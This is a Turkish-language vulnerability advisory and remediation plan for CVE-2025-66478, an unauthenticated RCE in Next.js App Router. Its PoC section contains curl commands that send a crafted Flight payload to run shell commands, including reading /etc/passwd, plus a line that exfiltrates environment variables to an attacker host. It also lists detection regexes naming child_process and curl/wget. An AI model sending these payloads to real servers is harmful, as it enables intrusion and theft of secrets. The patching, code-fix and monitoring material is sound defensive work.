# TODO: CVE-2025-66478 — Next.js App Router Uzaktan Kod Yurutme

## Meta Bilgiler
| Alan | Deger |
|------|-------|
| **Durum** | ACIK |
| **Tanimlayici** | CVE-2025-66478 |
| **Kritiklik** | Kritik |
| **Kategori Klasoru** | Oturum_Yonetimi/ |
| **Kaynak Arastirma** | [Nodejs_Guvenlik_Acigi_Arastirmasi.md](../Arastirmalar/Nodejs_Guvenlik_Acigi_Arastirmasi.md) |
| **Tarih** | 2025-12-20 |
| **Mevcut Dokuman** | Silindi — icerik bu TODO dosyasinda |

---

### 1. Ozet ve etki
*   **Yonetici Ozeti:** CVE-2025-66478, React2Shell zafiyetinin (CVE-2025-55182) Next.js ekosistemine ozel takip numarasidir. Next.js'in App Router mimarisi tamamen React Server Components uzerine insa edildigi icin, React Flight protokolundeki guvensiz deserialization zafiyetini dolayisiyla miras almaktadir. Bu durum, Next.js 15.x ve 16.x surumlerinde varsayilan konfigurasyonla, kimlik dogrulamasi gerektirmeden uzaktan kod yurutme (RCE) saglanmasina olanak tanimaktadir. Ozellikle tehlikeli olan husus, bircok gelistiricinin sadece "Next.js" kullandigini dusunerek React guncellemelerini gozardi etmesi ve create-next-app ile olusturulmus hicbir ozel kod eklenmemis bir uygulamanin dahi savunmasiz olmasidir. Bulut ortamlarindaki taramalara gore kamuya acik Next.js uygulamalarinin %44'u bu zafiyetten etkilenmistir.
*   **Etkilenen bilesenler:** Next.js 15.0.0-15.0.4, 15.1.0-15.1.8, 15.2.x-15.5.6, 16.0.0-16.0.6 (App Router kullanan tum uygulamalar), Next.js Canary 14.3.0-canary.77 ve sonrasi tum canary surumleri, create-next-app ile olusturulmus varsayilan App Router uygulamalari. NOT: Next.js 13.x, 14.x (Stable) ve Pages Router kullanan uygulamalar etkilenMEZ.

---

### 2. Teknik detay (nasil calisiyor)
*   Next.js'in App Router mimarisi, React Server Components (RSC) uzerine kurulmustur. App Router, `app/` dizin yapisini kullanir ve her sayfa varsayilan olarak bir Server Component'tir. Bu bilesenler, React Flight protokolu ile istemciye iletilir.
*   CVE-2025-55182'nin teknik detaylari CVE-2025-66478 icin de gecerlidir: React Flight protokolundeki guvensiz deserialization, saldirganin ozel hazirlanmis bir HTTP POST istegi ile sunucuda keyfi kod yurutmesine izin verir. Next.js baglaminda fark, App Router'in Flight protokolunu varsayilan olarak tum sayfalarda etkinlestirmesidir.
*   Next.js, Server Actions (`'use server'` direktifi ile tanimlanan fonksiyonlar) icin Flight protokolunu kullanir. Saldirgan, herhangi bir Server Action endpoint'ine (`/_next/data` veya form submission) manipule edilmis Flight verisi gondererek RCE elde edebilir.
*   Ek olarak, CVE-2025-55183 numarali iliskili bir zafiyet, Next.js'in Server Functions yapisi uzerinden kaynak kodun ifsasina (Source Code Disclosure) da yol acabilmektedir.
*   **Neden:** Kok neden, Next.js'in upstream bagimliligi olan React kutuphanesindeki Flight protokolu zafiyetidir (CVE-2025-55182). Next.js, React'in bu ozelligini varsayilan olarak etkinlestirdigi icin ve App Router mimarisinde sunucu-istemci siniri Flight protokolu uzerinden yonetildigi icin, React'teki zafiyet otomatik olarak Next.js'e yansimistir. Upstream/downstream bagimlilk zincirindeki guvenlik yamasinin gecikmesi riski artirmistir.

---

### 3. Adim adim istismar (PoC — kavramsal)
> **Uyari:** Bu bolum yalnizca egitim ve savunma amaclidir.
*   **1. Hedef:** Next.js 15.x veya 16.x App Router kullanan, internete acik web uygulamasi (e-ticaret sitesi, SaaS platformu, kurumsal web portali)
*   **2. Normal durum:**
    ```
    1. Kullanici, Next.js uygulamasinda bir sayfa acar
    2. App Router, sayfayi Server Component olarak render eder
    3. Server Actions (form gonderme, veri guncelleme) Flight protokolu ile istemciye iletilir
    4. Kullanici formu gonderdiginde, veri Flight formatinda sunucuya POST edilir
    5. Sunucu, veriyi isler ve sonucu dondurur
    ```
*   **3. Manipule edilmis durum (PoC payload):**
    ```bash
    # Next.js uygulamasinin App Router kullandigini tespit et
    curl -s https://hedef.com | grep -o '_next/static'
    # Server Action endpoint'ini bul
    curl -s https://hedef.com/_next/data/build-id/index.json

    # Manipule edilmis Flight verisi ile RCE
    curl -X POST https://hedef.com/_next/data \
      -H "Content-Type: text/x-component" \
      -H "Next-Action: action-id-here" \
      -d '0:{"$$typeof":"$Sreact.element","type":{"$$typeof":"$Sreact.server.reference","name":"","id":"child_process#exec"},"props":{"0":"id && cat /etc/passwd"}}'

    # Basarili RCE sonrasi: ortam degiskenlerini sizdir
    # payload: "env | curl -X POST -d @- https://saldirgan.com/collect"
    ```
*   **4. Analiz:** Next.js'in `/_next/data` endpoint'i ve Server Action isleyicisi, gelen `text/x-component` Content-Type'li POST isteklerini React Flight deserializer'a yonlendirir. Deserializer, `$Sreact.server.reference` tipindeki nesnelerde referans edilen modul ve fonksiyonu dogrulamadan cozumler. `child_process#exec` referansi, Node.js'in dahili `child_process` modulundeki `exec` fonksiyonunu tetikler ve payload olarak verilen shell komutu sunucu uzerinde calistirilir. App Router uygulamalarinda bu endpoint varsayilan olarak mevcuttur ve kimlik dogrulamasi gerektirmez.
*   **5. Kanit:** Sunucuda shell komutu calisir ve cikti saldirganin kontrol ettigi sunucuya iletilir. .env dosyasindaki `DATABASE_URL`, `JWT_SECRET`, `STRIPE_SECRET_KEY` gibi degerler ele gecirilir. Sunucu loglarinda `text/x-component` Content-Type ile beklenmeyen POST istekleri gorunur. Node.js islemi altinda `bash`, `sh`, `curl`, `wget` gibi alt islemler olusturulur.

---

### 4. Risk degerlendirmesi
*   **Kritiklik:** Kritik
*   **CVSS Skoru:** 10.0 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)
*   **Saldiri Yuzeyi:** Internete acik (Next.js App Router web uygulamalari — kimlik dogrulama gerekmez)
*   **Karmasiklik:** Dusuk (App Router varsayilan olarak savunmasiz, PoC kodlari kamuya acik, otomatik tarama araclari mevcut)

---

### 5. Kalici cozumler ve oneriler
*   **Kisa vadeli (Acil):** Next.js'i guvenli surume guncelleyin: v15.0.5+, v15.1.9+, v15.2.6+ veya v16.0.7+. `npx fix-react2shell-next` otomatik guncelleme aracini calistirin. package.json'da React bagimliliklarinin da guncellendigini dogrulayin (React 19.0.1+, 19.1.2+ veya 19.2.1+). Canary kullanicilarini 15.6.0-canary.58+ veya 16.1.0-canary.12+ surumune yonlendirin. Yama uygulanamayan sistemlerde WAF kurallarini yapilandirin.
*   **Orta vadeli:** Tum projelerde App Router vs Pages Router kullanimini belirleyin (Pages Router etkilenmez). CI/CD pipeline'inda Next.js ve React surum kontrolu ekleyin. Server Actions icin zod/yup ile giris dogrulama semalari tanimlayin. Next.js uygulamalarini minimum yetkili konteyner ortamlarinda calistirin (non-root, read-only filesystem). npm audit ve Snyk ile duzenli bagimlilk taramasi yapin.
*   **Uzun vadeli:** Uygulama guvenlik testlerini (DAST) CI/CD surecine entegre edin. Next.js guncellemelerini otomatik izleyen ve uyari ureten surec kurun. Server Components kullaniminda defense-in-depth prensibi uygulayin: her Server Action'da yetkilendirme kontrolu, giris dogrulama ve cikti kodlama. Yazilim tedarik zinciri guvenlik politikalarini (SBOM, bagimlilk yonetimi) kurumsallastirin. React ve Next.js guvenlik bulteni abone listesine katilin.

---

### 6. Ornek duzeltme kodu

**Zafiyetli kod:**
```javascript
// === GUVENSIZ: Varsayilan Next.js 15 App Router — savunmasiz surum ===
// package.json:
// { "next": "15.1.0", "react": "19.1.0" }

// app/page.jsx — App Router varsayilan sayfa
export default async function Page() {
    return <h1>Hosgeldiniz</h1>;
    // Bu bos sayfa bile App Router + Flight protokolu kullanir
    // ve RCE'ye aciktir!
}

// app/actions.js — Server Action (dogrulamasiz)
'use server';
export async function updateProfile(formData) {
    const name = formData.get('name');
    // Giris dogrulama yok — Flight deserialization uzerinden RCE mumkun
    await db.user.update({ name });
}
```

**Guvenli kod:**
```javascript
// === GUVENLI: Yamali surum + giris dogrulama + yetkilendirme ===
// package.json:
// { "next": "15.2.6", "react": "19.2.1" }

// app/actions.js — Guvenli Server Action
'use server';
import { z } from 'zod';
import { getServerSession } from 'next-auth';
import { authOptions } from '@/lib/auth';

const profileSchema = z.object({
    name: z.string().min(1).max(100).regex(/^[\w\sçğıöşüÇĞİÖŞÜ]+$/),
});

export async function updateProfile(formData) {
    // 1. Yetkilendirme kontrolu
    const session = await getServerSession(authOptions);
    if (!session?.user) {
        throw new Error('Yetkisiz erisim');
    }

    // 2. Giris dogrulama (strict schema)
    const raw = { name: formData.get('name') };
    const result = profileSchema.safeParse(raw);
    if (!result.success) {
        return { error: 'Gecersiz veri' };
    }

    // 3. Dogrulanmis veriyle islem
    await db.user.update({
        where: { id: session.user.id },
        data: { name: result.data.name },
    });

    return { success: true };
}
```

```bash
# Next.js surum kontrolu ve guncelleme
npx next --version
cat node_modules/next/package.json | grep '"version"'

# Guvenli surume guncelle (surume gore)
# v15.0.x: npm install next@15.0.5 react@19.0.1 react-dom@19.0.1
# v15.1.x: npm install next@15.1.9 react@19.1.2 react-dom@19.1.2
# v15.2.x: npm install next@15.2.6 react@19.2.1 react-dom@19.2.1
# v16.x:   npm install next@16.0.7 react@19.2.1 react-dom@19.2.1

# Otomatik guncelleme araci
npx fix-react2shell-next

# App Router vs Pages Router kontrolu
ls -d app/ pages/ 2>/dev/null
# app/ dizini varsa App Router (etkilenmis)
# pages/ dizini varsa Pages Router (etkilenmemis)

# CI/CD'de surum dogrulama scripti
node -e "
const pkg = require('./package.json');
const nextVer = pkg.dependencies?.next || pkg.devDependencies?.next;
console.log('Next.js surum:', nextVer);
if (nextVer && nextVer.includes('15.1.') && parseInt(nextVer.split('.')[2]) < 9) {
    console.error('UYARI: Next.js surumu CVE-2025-66478 zafiyetinden etkilenmis!');
    process.exit(1);
}
"
```

---

### 7. Kontrol Listesi (Checklist)
**Hazirlik**
*   [ ] Next.js versiyonlarini tum projelerde kontrol et (npm ls next)
*   [ ] App Router vs Pages Router kullanimini belirle (app/ vs pages/ dizini)
*   [ ] Next.js 13.x ve 14.x (stable) surumlerinin guvenli oldugunu dogrula
*   [ ] Canary surumleri kullanan projeleri tespit et
*   [ ] React bagimlilk surumlerini kontrol et (React 19.0.0-19.2.0 etkilenmis)
*   [ ] Internete acik Next.js uygulamalarini onceliklendir

**Duzeltme**
*   [ ] Next.js'i guvenli surume guncelle (15.0.5+, 15.1.9+, 15.2.6+ veya 16.0.7+)
*   [ ] Canary kullanicilarini 15.6.0-canary.58+ veya 16.1.0-canary.12+ surumune guncelle
*   [ ] `npx fix-react2shell-next` otomatik guncelleme aracini calistir
*   [ ] package.json'da React bagimliliklarinin da guncellendigini dogrula
*   [ ] Server Actions icin zod/yup ile giris dogrulama katmani ekle
*   [ ] WAF kurallarini React Flight pattern'leri icin yapilandir

**Dogrulama**
*   [ ] App Router uygulamalarinda RCE testini yama sonrasi tekrarla
*   [ ] Server Functions uzerinden kaynak kod ifsasi (CVE-2025-55183) testini yap
*   [ ] Guncel surumlerde Flight protokolu guvenlik kontrollerini dogrula
*   [ ] npm audit ciktisindan React2Shell uyarisinin kaldigini kontrol et
*   [ ] CI/CD pipeline'inda surum dogrulama scriptinin calistigini onayla

---

### 8. Izleme ve uyarilar
*   **SIEM/Log Kurallari:**
    *   Next.js uygulama loglarinda `/_next/data` ve Server Action endpoint'lerine gelen anormal POST isteklerini izle
    *   `text/x-component` Content-Type ile gelen isteklerin frekansini ve boyutunu izle
    *   Regex: `(?i)(_next/data|_next/.*action|text/x-component)`
    *   Regex: `(?i)(\$Sreact|server\.reference|child_process|__proto__|constructor\[)`
    *   Node.js surec agacinda beklenmeyen alt islemleri (curl, wget, bash, sh) izle
*   **Anomali Tespiti:**
    *   Next.js uygulamasinda `text/x-component` Content-Type ile normalden fazla POST istegi
    *   `/_next/data` endpoint'ine kimlik dogrulamasi olmadan gelen buyuk payload'li istekler
    *   Node.js islemi altinda beklenmeyen islem olusturulmasi (process tree anomalisi)
    *   Uygulama dizininde veya /tmp'de beklenmeyen dosya olusturulmasi
    *   .env dosyalarina veya node_modules disindaki dosyalara beklenmeyen okuma erisimi
    *   Sunucudan bilinmeyen dis IP adreslerine beklenmeyen ag baglantilari

---

## Notlar
React2Shell (CVE-2025-55182) ile dogrudan iliskili — upstream (React) ve downstream (Next.js) bagimlilk zinciri. Bircok gelistirici sadece Next.js kullandigini dusunerek React guncellemelerini atlayabilir — React ve Next.js'in BIRLIKTE guncellenmesi zorunludur. create-next-app ile olusturulmus bos uygulamalar bile savunmasizdir (varsayilan App Router). Next.js 13.x, 14.x (Stable) ve Pages Router kullanan uygulamalar etkilenMEZ. CVE-2025-55183 (kaynak kod ifsasi) iliskili zafiyeti de degerlendirin. USOM TR-25-0428 bildirimi yayinlandi.
